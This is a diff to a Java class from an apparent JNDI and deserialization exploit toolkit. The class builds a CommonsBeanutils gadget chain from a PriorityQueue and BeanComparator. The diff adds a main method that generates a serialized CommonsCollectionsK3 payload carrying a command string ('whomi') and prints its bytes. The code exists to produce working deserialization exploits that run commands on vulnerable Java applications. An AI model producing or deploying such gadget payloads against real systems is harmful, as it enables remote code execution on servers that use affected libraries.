@@ -5,6 +5,7 @@ import com.nu1r.jndi.gadgets.annotation.Authors;
 import com.nu1r.jndi.gadgets.annotation.Dependencies;
 import com.nu1r.jndi.gadgets.utils.Gadgets;
 import com.nu1r.jndi.gadgets.utils.Reflections;
+import com.nu1r.jndi.gadgets.utils.Serializer;
 import com.nu1r.jndi.gadgets.utils.SuClassLoader;
 import javassist.ClassClassPath;
 import javassist.ClassPool;
@@ -12,6 +13,8 @@ import javassist.CtClass;
 import javassist.CtField;
 import org.apache.logging.log4j.util.PropertySource;
 
+import java.io.ByteArrayOutputStream;
+import java.util.Arrays;
 import java.util.Comparator;
 import java.util.PriorityQueue;
 
@@ -51,5 +54,13 @@ public class CommonsBeanutilsPropertySource183 implements ObjectPayload<Object>{
         Reflections.setFieldValue(beanComparator, "property", "outputProperties");
 
         return queue;
+    }
+
+    public static void main(String[] args) throws Exception {
+        ObjectPayload payload = CommonsCollectionsK3.class.newInstance();
+        Object                object = payload.getObject(PayloadType.nu1r,"whomi");
+        ByteArrayOutputStream out    = new ByteArrayOutputStream();
+        byte[]                bytes  = Serializer.serialize(object, out);
+        System.out.println(Arrays.toString(bytes));
     }
 }
